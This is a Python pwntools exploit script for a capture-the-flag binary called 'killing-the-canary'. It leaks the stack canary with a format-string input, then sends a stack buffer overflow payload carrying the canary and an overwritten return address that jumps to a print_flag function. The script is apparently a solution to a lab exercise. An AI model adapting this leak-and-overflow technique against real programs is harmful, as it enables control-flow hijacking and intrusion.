#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])
# gdb.attach(r)

r.recvuntil(b"What's your name? ")
r.sendline(b"%19$0lx") #Add your code here

val = r.recvuntil(b"What's your message? ")
# log.info(val)
canary = re.match(b"Hello, ([0-9a-f]+)\n!.*", val).groups()[0]
log.info(f"Canary: {canary}")

win = exe.symbols['print_flag']
# log.info(hex(win))


payload = b"" # Add your payload here

# buffer overflow
for i in range(72):
    payload += b"\x00"

# canary (little endian)
for i in range(8):
    payload += bytes.fromhex(canary[14-2*i:16-2*i].decode())

# saved rbp
for i in range(8):
    payload += b"\x00"

# return address (little endian)
payload += b"\x36\x12\x40\x00\x00\x00\x00\x00"

r.sendline(payload)

r.recvline()
r.interactive()
